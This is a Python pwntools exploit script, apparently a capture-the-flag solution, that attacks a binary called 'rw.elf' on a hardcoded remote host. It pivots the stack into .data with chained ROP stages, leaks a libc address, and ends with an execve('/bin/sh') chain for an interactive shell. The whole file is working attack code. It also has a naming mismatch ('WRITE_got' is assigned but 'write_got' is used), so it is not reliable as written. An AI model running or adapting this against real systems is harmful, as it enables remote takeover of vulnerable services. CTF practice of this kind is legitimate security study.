#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('rw.elf')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11641)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

POP_RDI = 0x000000000040123b
POP_RSI = 0x0000000000401156
POP_RDX = 0x0000000000401152
POP_RSP = 0x0000000000401154
LEAVE = 0x0000000000401190
WRITE = 0x401030
READ = 0x401050
DATA_ADDR = 0x404038
ROP1_SIZE = 0x40
ROP2_SIZE = 0x40
ROP3_SIZE = 0x90
ROP4_SIZE = 0x60

io = start()
pause()

# 1st small ROP in STACK
io.recvuntil(b'Hi')
rop1 = cyclic(16)
rop1 += p64(DATA_ADDR - 0x8)            # fix shift RSP when LEAVE
rop1 += p64(POP_RSI)
rop1 += p64(DATA_ADDR)
rop1 += p64(READ)
rop1 += p64(LEAVE)                      # remember about shift RSP!!!
rop1 = rop1.ljust(ROP1_SIZE, b'\x00')
io.send(rop1)

# 2nd small ROP in .DATA
rop2 = b''
rop2 += p64(POP_RDX)
rop2 += p64(ROP3_SIZE)                  # finally BIG rop
rop2 += p64(POP_RSI)
rop2 += p64(DATA_ADDR + ROP2_SIZE)
rop2 += p64(READ)
rop2 += p64(POP_RSP)
rop2 += p64(DATA_ADDR + ROP2_SIZE)
rop2 = rop2.ljust(ROP2_SIZE, b'\x00')
io.send(rop2)

# 3rd big ROP in .DATA
rop3 = b''
rop3 += p64(POP_RSI)
rop3 += p64(0x404018)
rop3 += p64(POP_RDI)
rop3 += p64(0x1)
rop3 += p64(POP_RDX)
rop3 += p64(0x8)
rop3 += p64(WRITE)                      # leak libc address
rop3 += p64(POP_RDI)
rop3 += p64(0x0)
rop3 += p64(POP_RSI)
rop3 += p64(DATA_ADDR + ROP2_SIZE + ROP3_SIZE)
rop3 += p64(POP_RDX)
rop3 += p64(ROP4_SIZE)
rop3 += p64(READ)
rop3 += p64(POP_RSP)
rop3 += p64(DATA_ADDR + ROP2_SIZE + ROP3_SIZE)
rop3 = rop3.ljust(ROP3_SIZE)
io.send(rop3)

WRITE_got = io.recv()                   # catch libc address

libc = ELF("libc.so.6_1ec728d58f7fc0d302119e9bb53050f8")
BASE = u64(write_got) - libc.sym["write"]
POP_RAX = 0x000000000004a550 + BASE
BINSH = 0x1B75AA + BASE
SYSCALL = 0x000000000002584d + BASE

# 4th big ROP in .DATA
rop4 = b''
rop4 += p64(POP_RAX)
rop4 += p64(59)
rop4 += p64(POP_RDI)
rop4 += p64(BINSH)
rop4 += p64(POP_RSI)
rop4 += p64(0x0)
rop4 += p64(POP_RDX)
rop4 += p64(0x0)
rop4 += p64(SYSCALL)                    # execve('/bin/sh', 0, 0)
rop4 = rop4.ljust(ROP4_SIZE)
io.send(rop4)

io.interactive()

